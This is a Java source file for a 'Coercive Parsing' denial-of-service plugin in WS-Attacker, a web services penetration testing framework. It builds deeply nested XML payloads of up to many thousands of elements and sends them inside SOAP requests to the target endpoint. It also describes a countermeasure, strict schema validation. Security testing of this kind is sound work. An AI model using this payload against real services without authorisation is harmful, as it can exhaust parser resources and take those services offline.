/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;


import org.apache.xmlbeans.XmlException;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;

import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.composition.plugin.option.AbstractOptionBoolean;
import wsattacker.main.composition.plugin.option.AbstractOptionChoice;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.main.testsuite.TestSuite;
import wsattacker.util.SoapUtilities;
import wsattacker.util.SortedUniqueList;

import com.eviware.soapui.impl.wsdl.WsdlInterface;
import com.eviware.soapui.impl.wsdl.WsdlOperation;
import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.WsdlSubmit;
import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
import com.eviware.soapui.model.iface.Operation;
import com.eviware.soapui.model.iface.Request.SubmitException;
import com.eviware.soapui.model.iface.Response;
import com.eviware.soapui.support.types.StringToStringMap;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import wsattacker.plugin.dos.dosExtension.mvc.AttackMVC;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.lang.String;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;
import net.sf.saxon.functions.Replace;
import org.w3c.dom.DOMImplementation;
import org.w3c.dom.DocumentType;
import org.w3c.dom.Element;
import wsattacker.main.composition.plugin.PluginFunctionInterface;
import wsattacker.main.plugin.option.OptionSimpleText;
import wsattacker.plugin.dos.dosExtension.function.postanalyze.DOSPostAnalyzeFunction;
import wsattacker.plugin.dos.dosExtension.mvc.model.AttackModel;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage.PayloadPosition;

public class CoerciveParsing extends AbstractDosPlugin {

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">


    private static final long serialVersionUID = 1L;
    // </editor-fold>

    // Custom Attributes
    private AbstractOptionInteger optionNumberTags;
    private OptionSimpleVarchar optionTag;
    private OptionSimpleText optionMessage;


    @Override 
    public void initializeDosPlugin() {

	// Custom attack parameters
	optionNumberTags =  new OptionLimitedInteger("Param 8", 75000, "Number of nested elements", 0, 147483647);	
	optionTag =  new OptionSimpleVarchar("Param 9", "X", "Element name (will be placed between < and >)");	
	getPluginOptions().add(optionNumberTags );
	getPluginOptions().add(optionTag);
	
    }
    
    @Override 
    public PayloadPosition getPayloadPosition(){
	return PayloadPosition.HEADERLASTCHILDELEMENT;
    }   

    @Override
    public String getName() {
	    return "Coercive Parsing";
    }

    @Override
    public String getDescription() {
	    return "This attack plugin checks if the server is vulnerable to a \"Coercive Parsing Attack\".\n" +
		    "The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below \n"+
		    "with the defined number of nested elements.\n"+
		    "The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message"+
		    "The number of nested elements is defined in \"Param 8 - number elements\".\n"+
		    "The element name of the nested elements is defined in \"Param 9 - element name\" "+
		    "I.e. if you choose \"X\" as an element name, each element has a size of 7 bytes.\n" +
		    "This would result in the following filesizes:\n"+
		    "~ 150000 Tags result in a 1 mb file\n"+
		    "~  75000 Tags result in a 0.5 mb file \n"+
		    "~  15000 Tags result in a 0.1 mb file\n"+
		    "~   7500 Tags result in a 0.05 mb file"+
		    "\n\n";
    }

    @Override
    public String getCountermeasures(){
      return "The \"Coercive Parsing\" attack can be fully stopped by using strict schema validation. "
	    + "Each WSDL should contain a detailed description of the used elements, attributes, and data types. "
	    + "For more information see: http://clawslab.nds.rub.de/wiki/index.php/Coercive_Parsing";
    }        

    @Override
    public String getAuthor() {
	    return "Andreas Falkenberg";
    }

    @Override
    public String getVersion() {
	    return "1.0 / 2012-09-28";
    }


    @Override
    public void createTamperedRequest(){

	// generate Payload
	String payload = "";
	String elementNameOpen = "<"+optionTag.getValue()+">";
	String elementNameClose = "</"+optionTag.getValue()+">";   
	StringBuilder sb = new StringBuilder();
	 for(int i=0; i<optionNumberTags.getValue(); i++){
	    sb.append(elementNameOpen);
	}
	for(int i=0; i<optionNumberTags.getValue(); i++){
	    sb.append(elementNameClose);
	}	     

	// replace "Payload-Attribute" with Payload-String 
	String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
	String soapMessageFinal =  this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, sb.toString());

	// get HeaderFields from original request, if required add custom headers - make sure to clone!
	Map<String, String> httpHeaderMap = new HashMap<String, String>();
	for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
	    httpHeaderMap.put(entry.getKey(), entry.getValue());
	}		      

	// write payload and header to TamperedRequestObject
	this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
    } 	


    // ----------------------------------------------------------
    // All custom DOS specific Methods below! 
    // ----------------------------------------------------------

}
